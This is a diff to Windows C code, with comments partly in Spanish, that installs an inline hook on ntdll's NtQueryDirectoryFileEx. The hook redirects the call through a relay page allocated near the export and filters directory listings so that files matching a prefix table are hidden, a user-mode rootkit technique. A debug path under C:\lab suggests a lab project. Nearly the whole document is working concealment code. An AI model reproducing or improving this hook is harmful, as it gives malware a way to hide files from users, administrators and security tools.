@@ -30,6 +30,7 @@ static BYTE                   g_saved[PATCH_SIZE];
 static pNtQueryDirectoryFileEx  g_original_ex   = NULL;
 static pNtQueryDirectoryFileEx  g_trampoline_ex = NULL;
 static BYTE                     g_saved_ex[PATCH_SIZE];
+static BYTE                    *g_relay_ex      = NULL;
 
 /* --- Helpers para extraer FileName de cada struct ----------------------- */
 
@@ -154,7 +155,44 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(
         FileInformation, Length, FileInformationClass,
         QueryFlags, FileName);
 
+#ifdef FILE_HIDE_DIAG
+    {
+        static int logged = 0;
+        if (!logged) {
+            logged = 1;
+            HANDLE hf = CreateFileA("C:\\lab\\debug_ex_class.bin",
+                                    GENERIC_WRITE, 0, NULL,
+                                    CREATE_ALWAYS, 0, NULL);
+            if (hf != INVALID_HANDLE_VALUE) {
+                DWORD w;
+                ULONG data[2] = { FileInformationClass, (ULONG)status };
+                WriteFile(hf, data, sizeof(data), &w, NULL);
+                CloseHandle(hf);
+            }
+        }
+    }
+#endif
     return filter_entries(status, FileInformation, Length, FileInformationClass);
+}
+
+/* --- alloc_near: VirtualAlloc within ±16 MB of target ------------------- */
+
+static BYTE *alloc_near(void *target, SIZE_T size)
+{
+    UINT_PTR base = (UINT_PTR)target & ~(UINT_PTR)0xFFFF;
+    for (int i = 1; i < 256; i++) {
+        void *p = VirtualAlloc((void *)(base + i * 0x10000), size,
+                               MEM_COMMIT | MEM_RESERVE,
+                               PAGE_EXECUTE_READWRITE);
+        if (p) return (BYTE *)p;
+    }
+    for (int i = 1; i < 256; i++) {
+        void *p = VirtualAlloc((void *)(base - i * 0x10000), size,
+                               MEM_COMMIT | MEM_RESERVE,
+                               PAGE_EXECUTE_READWRITE);
+        if (p) return (BYTE *)p;
+    }
+    return NULL;
 }
 
 /* --- write_abs_jmp: mov rax, addr; jmp rax (12 bytes) ------------------ */
@@ -224,28 +262,26 @@ int file_hide_install(PrefixTable *table)
             INT32 orig_disp = *(INT32 *)(ex_ptr + 1);
             void *orig_target = ex_ptr + 5 + orig_disp;
 
-            /* Check that our hook is within ±2GB (E9 rel32 range). */
-            INT64 delta = (BYTE *)HookedNtQueryDirectoryFileEx - (ex_ptr + 5);
-            if (delta < -2147483648LL || delta > 2147483647LL) {
-                g_original_ex = NULL;   /* too far — skip */
-            } else {
+            /* Allocate a relay page near the export (within E9
+               rel32 range).  Layout:
+               relay[0..11]  = gateway  → JMP HookedNtQueryDirectoryFileEx
+               relay[16..27] = trampoline → JMP orig_target               */
+            g_relay_ex = alloc_near(ex_ptr, 64);
+            if (g_relay_ex) {
+                write_abs_jmp(g_relay_ex, (void *)HookedNtQueryDirectoryFileEx);
+                write_abs_jmp(g_relay_ex + 16, orig_target);
+                g_trampoline_ex = (pNtQueryDirectoryFileEx)(g_relay_ex + 16);
+
+                INT64 delta = g_relay_ex - (ex_ptr + 5);
                 memcpy(g_saved_ex, ex_ptr, PATCH_SIZE);
 
-                g_trampoline_ex = (pNtQueryDirectoryFileEx)
-                    VirtualAlloc(NULL, TRAMP_SIZE,
-                                 MEM_COMMIT | MEM_RESERVE,
-                                 PAGE_EXECUTE_READWRITE);
-                if (g_trampoline_ex) {
-                    write_abs_jmp((BYTE *)g_trampoline_ex, orig_target);
-
-                    if (VirtualProtect(ex_ptr, 5,
-                                       PAGE_EXECUTE_READWRITE, &oldProt)) {
-                        *(INT32 *)(ex_ptr + 1) = (INT32)delta;
-                        VirtualProtect(ex_ptr, 5, oldProt, &tmp);
-                    }
-                } else {
-                    g_original_ex = NULL;
+                if (VirtualProtect(ex_ptr, 5,
+                                   PAGE_EXECUTE_READWRITE, &oldProt)) {
+                    *(INT32 *)(ex_ptr + 1) = (INT32)delta;
+                    VirtualProtect(ex_ptr, 5, oldProt, &tmp);
                 }
+            } else {
+                g_original_ex = NULL;
             }
         } else {
             /* Standard syscall stub: normal 16-byte trampoline. */
@@ -298,7 +334,11 @@ void file_hide_remove(void)
             DWORD tmp;
             VirtualProtect((void *)g_original_ex, PATCH_SIZE, oldProt, &tmp);
         }
-        if (g_trampoline_ex) {
+        if (g_relay_ex) {
+            VirtualFree(g_relay_ex, 0, MEM_RELEASE);
+            g_relay_ex = NULL;
+            g_trampoline_ex = NULL;
+        } else if (g_trampoline_ex) {
             VirtualFree((void *)g_trampoline_ex, 0, MEM_RELEASE);
             g_trampoline_ex = NULL;
         }
